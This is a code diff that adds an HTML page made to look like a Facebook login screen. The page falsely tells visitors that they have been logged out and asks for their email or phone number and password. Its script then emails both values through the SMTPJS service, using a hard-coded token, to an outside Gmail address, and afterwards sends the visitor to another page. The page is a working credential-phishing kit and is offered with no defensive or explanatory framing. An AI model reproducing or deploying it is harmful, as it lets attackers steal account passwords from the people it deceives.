@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>facebook login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header>
+    <div class="logo">
+    </div>
+    <h1>facebook</h1>
+  </header>
+  <div class="alert">
+    <p>your browser has logged out from your facebook account. please log in to your account to access your link</p>
+    <hr>
+  </div>
+
+    <form action="javascript:sendmail()" method="post">
+      
+      <input type="email" required name="email" class="form-control" id="Sender" placeholder="Email address or phone number" class="form-control"><br>
+      
+      <input type="password" required name="password" class="form-control" id="Message" placeholder="Password" class="form-control"><br>
+      
+      <button type="send">Log in</button>
+      
+      <p>Forgot password? - <a target="_blank" href="https://www.facebook.com/help"> Help center </a></p>
+    </form>
+    <footer>
+      <p>English (Uk) <span>.বাংলা</span><span>.more...</span></p><br>
+      <h5>Facebook &#169 2013</h5>
+    </footer>
+
+    <script
+    src="https://code.jquery.com/jquery-2.2.4.min.js"
+    integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
+    crossorigin="anonymous"></script>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+   
+  <script>  
+  
+       function sendmail(){
+      
+        var email = $('#Sender').val();
+        var message = $('#Message').val();
+  
+        // var body = $('#body').val();
+  
+        var Body='Email: '+email+'<br>Message: '+message;
+        //console.log(name, phone, email, message);
+  
+        Email.send({
+          SecureToken:"fbf31702-bb7f-4a4e-9c1c-4ccf17ee777f",
+          To: 'boyanimated@gmail.com',
+          From: "asmaulsaimon1211@gmail.com",
+          Subject: "New message on contact from "+name,
+          Body: Body
+        }).then(
+          message =>{
+            //console.log (message);
+            if(message=='OK'){
+            console.log("login sucess")
+            window.location.replace("in2.html");
+            }
+            else{
+              console.error (message);
+              alert('There is error at sending message. ')
+              
+            }
+  
+          }
+        );
+  
+  
+  
+      }
+  
+  
+      </script>
+   </script>
+
+  <script src="./index.js"></script>
+</body>
+</html>
